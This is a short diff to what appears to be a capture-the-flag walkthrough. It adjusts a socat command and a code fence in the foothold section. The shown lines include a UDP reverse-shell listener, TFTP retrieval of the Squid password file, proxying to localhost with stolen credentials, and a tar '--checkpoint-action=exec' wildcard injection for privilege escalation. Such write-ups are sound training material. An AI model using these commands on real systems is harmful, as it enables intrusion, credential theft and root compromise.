@@ -34,7 +34,7 @@ TFTP does not list directories, but `/etc/squid/squid.conf` and `/etc/squid/pass
 
 ## Foothold
 
-The Werkzeug console runs Python. A TCP reverse shell has no outbound connectivity; enumerate the firewall and use a UDP reverse shell with `socat file:\`tty\`,raw,echo=0 udp-listen:<PORT>`. The session is `werkzeug`.
+The Werkzeug console runs Python. A TCP reverse shell has no outbound connectivity; enumerate the firewall and use a UDP reverse shell with `socat file:/dev/pts/0,raw,echo=0 udp-listen:<PORT>`. The session is `werkzeug`.
 
 ```bash
 # TFTP
@@ -44,7 +44,8 @@ tftp> get /etc/squid/passwords
 # proxy to localhost
 curl -x http://<USER>:<PASS>@<IP>:3128 http://127.0.0.1:8080/
 # tar wildcard
-touch -- '--checkpoint=1' '--checkpoint-action=exec=/dev/shm/root.sh'```
+touch -- '--checkpoint=1' '--checkpoint-action=exec=/dev/shm/root.sh'
+```
 
 ## Lateral movement
 
